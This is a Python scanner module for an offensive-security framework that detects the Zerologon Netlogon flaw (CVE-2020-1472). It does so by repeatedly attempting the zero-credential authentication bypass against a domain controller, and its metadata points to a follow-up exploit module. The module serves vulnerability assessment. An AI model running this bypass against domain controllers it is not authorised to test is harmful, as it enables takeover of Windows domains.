#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect Zerologon Netlogon authentication bypass (CVE-2020-1472)."""

from kittysploit import *
from lib.protocols.tcp.tcp_scanner_client import Tcp_scanner_client


class Module(Scanner, Tcp_scanner_client):
    __info__ = {
        'name': 'Zerologon CVE-2020-1472 Detect',
        'description': (
            'Detects CVE-2020-1472 (Zerologon) by attempting Netlogon '
            'NetrServerAuthenticate3 with all-zero credentials against the '
            'domain controller Netlogon RPC interface (TCP/135 or 445).'
        ),
        'author': ['KittySploit Team', 'SecuraBV'],
        'severity': 'critical',
        'cve': ['CVE-2020-1472'],
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2020-1472',
            'https://www.secura.com/blog/2020/09/15/zerologon',
        ],
        'tags': ['scanner', 'tcp', 'zerologon', 'netlogon', 'ad', 'kev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 50,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals', 'tech_hints'],
            'chain': {
                'suggested_followups': [
                    'exploits/windows/dcerpc/zerologon_cve_2020_1472_auth_bypass',
                ],
            },
        },
    }

    dc_name = OptString('', 'Domain controller NetBIOS name (without $)', required=True)
    rpc_port = OptPort(135, 'RPC endpoint mapper port', required=False)
    max_attempts = OptInteger(
        64,
        'Max Netlogon zero-auth attempts before giving up (detect only)',
        required=False,
        advanced=True,
    )

    _FLAGS = 0x212FFFF
    _ACCESS_DENIED = 0xC0000022

    def _require_impacket(self):
        try:
            from impacket.dcerpc.v5 import epm, nrpc, transport  # noqa: F401
        except ImportError as exc:
            raise ImportError('impacket is required. Install with: pip install impacket') from exc

    def _connect(self):
        from impacket.dcerpc.v5 import epm, nrpc, transport

        host = self._host()
        port = int(self.rpc_port or 135)
        if not host:
            return None
        binding = epm.hept_map(host, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
        rpctransport = transport.DCERPCTransportFactory(binding)
        if port != 135:
            rpctransport.set_dport(port)
        rpc_con = rpctransport.get_dce_rpc()
        rpc_con.connect()
        rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
        return rpc_con

    def _try_zero_auth(self, rpc_con, dc_handle: str, target: str) -> bool | None:
        from impacket.dcerpc.v5 import nrpc

        plaintext = b'\x00' * 8
        ciphertext = b'\x00' * 8
        nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target + '\x00', plaintext)
        try:
            resp = nrpc.hNetrServerAuthenticate3(
                rpc_con,
                dc_handle + '\x00',
                target + '$\x00',
                nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                target + '\x00',
                ciphertext,
                self._FLAGS,
            )
            return int(resp['ErrorCode']) == 0
        except nrpc.DCERPCSessionError as exc:
            if exc.get_error_code() == self._ACCESS_DENIED:
                return False
            raise

    def run(self):
        try:
            self._require_impacket()
        except ImportError as exc:
            print_error(str(exc))
            return False
        host = self._host()
        dc = str(self.dc_name or '').strip().rstrip('$')
        if not host or not dc:
            print_error('Set target and dc_name')
            return False
        dc_handle = f'\\\\{dc}'
        attempts = max(int(self.max_attempts or 64), 1)
        try:
            rpc_con = self._connect()
        except Exception as exc:
            print_error(f'Netlogon RPC unreachable: {exc}')
            return False
        for i in range(attempts):
            try:
                if self._try_zero_auth(rpc_con, dc_handle, dc):
                    self.set_info(
                        severity='critical',
                        cve='CVE-2020-1472',
                        reason=f'Zero-auth Netlogon succeeded on attempt {i + 1}',
                        dc_name=dc,
                    )
                    return True
            except Exception:
                try:
                    rpc_con = self._connect()
                except Exception:
                    break
        self.set_info(
            severity='medium',
            cve='CVE-2020-1472',
            reason=f'No zero-auth success in {attempts} attempts (may be patched)',
            dc_name=dc,
        )
        return False
